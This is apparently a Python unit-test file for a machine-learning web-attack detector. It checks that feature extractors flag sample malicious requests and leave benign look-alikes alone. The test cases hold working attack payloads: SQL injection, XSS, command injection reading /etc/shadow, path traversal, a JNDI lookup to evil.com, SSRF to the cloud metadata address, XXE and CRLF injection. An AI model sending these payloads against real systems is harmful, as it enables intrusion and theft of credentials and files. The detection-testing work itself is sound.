import os
import sys
import unittest

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ml.hybrid_model import MAX_UNITS, request_units
from ml.value_features import VALUE_FEATURE_COLUMNS, extract_value_features


def vf(method, uri, query="", body=""):
    return extract_value_features(method, uri, query, body)


class RequestUnitsTests(unittest.TestCase):
    def test_many_fields_are_truncated_not_rejected(self):
        body = "&".join(f"f{i}=v{i}" for i in range(200))
        units = request_units("POST", "/form", "", body)
        self.assertEqual(len(units), MAX_UNITS)


class ValueFeatureTests(unittest.TestCase):
    def test_payload_scores_the_same_in_any_context(self):
        # The 27/09 hybrid scored the first 1.00 and the second 0.002
        wrapper = vf("POST", "/", "", "p=;cat /etc/shadow")
        app = vf("POST", "/api/run", "", "cmd=;cat /etc/shadow")
        for name in ("v_cmd_injection", "v_sensitive_file", "v_detector_units"):
            self.assertEqual(wrapper[name], app[name], name)
            self.assertGreaterEqual(app[name], 1, name)

    def test_attack_detectors(self):
        cases = {
            "v_sqli_libinjection": ("GET", "/items", "id=1'+UNION+SELECT+null,username+FROM+users--", ""),
            "v_xss_libinjection": ("GET", "/profile", "name=<img+src=x+onerror=alert(1)>", ""),
            "v_cmd_injection": ("GET", "/tools/dns", "host=google.com|whoami", ""),
            "v_path_traversal": ("GET", "/download", "file=..%252F..%252Fetc%252Fpasswd", ""),
            "v_sensitive_file": ("GET", "/include", "page=....//....//etc/passwd", ""),
            "v_template_injection": ("GET", "/api/log", "input=${jndi:ldap://evil.com/x}", ""),
            "v_nosql_operator": ("POST", "/api/login", "", '{"user": "admin", "password": {"$ne": null}}'),
            "v_ssrf_target": ("GET", "/proxy", "url=http://169.254.169.254/latest/meta-data/", ""),
            "v_code_exec": ("GET", "/page", "f=php://filter/convert.base64-encode/resource=index.php", ""),
            "v_xml_entity": ("POST", "/xml", "", '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'),
            "v_crlf_header": ("GET", "/redirect", "to=%0d%0aSet-Cookie:+sid=evil", ""),
            "v_restricted_file": ("GET", "/app/.env", "", ""),
        }
        for name, request in cases.items():
            self.assertGreaterEqual(vf(*request)[name], 1, name)

    def test_traversal_in_the_path_itself(self):
        feats = vf("GET", "/static/../../etc/passwd")
        self.assertGreaterEqual(feats["v_path_traversal"], 1)
        self.assertGreaterEqual(feats["v_sensitive_file"], 1)

    def test_encoding_and_comment_evasion_is_normalised(self):
        feats = vf("GET", "/items", "id=1%2527/**/UNION/**/SELECT/**/password/**/FROM/**/users--")
        self.assertGreaterEqual(feats["v_sqli_libinjection"], 1)
        self.assertGreaterEqual(feats["v_max_decode_layers"], 1)

    def test_benign_look_alikes_fire_no_detector(self):
        benign = [
            ("GET", "/search", "q=O'Reilly+books", ""),
            ("GET", "/search", "q=mechanical+keyboard", ""),
            ("GET", "/search", "q=%E0%B8%81%E0%B8%B2%E0%B8%A3%E0%B9%80%E0%B8%A3%E0%B8%B5%E0%B8%A2%E0%B8%99", ""),
            ("POST", "/register", "", "email=john%40example.com&password=P%40ss%3Bword%21&name=Tom+%26+Jerry"),
            ("GET", "/products", "sort=price&filter=price>100&page=2", ""),
            ("POST", "/api/orders", "", '{"items": [{"id": 12, "qty": 1}], "note": "leave at the door; cat is friendly"}'),
            ("GET", "/redirect", "next=https://www.example.com/account", ""),
            ("GET", "/assets/js/app.min.js", "v=3.2.1", ""),
            ("GET", "/environment/overview", "", ""),
        ]
        for request in benign:
            self.assertEqual(vf(*request)["v_detector_units"], 0, request)

    def test_all_columns_present(self):
        self.assertEqual(set(vf("GET", "/")), set(VALUE_FEATURE_COLUMNS))


if __name__ == "__main__":
    unittest.main()
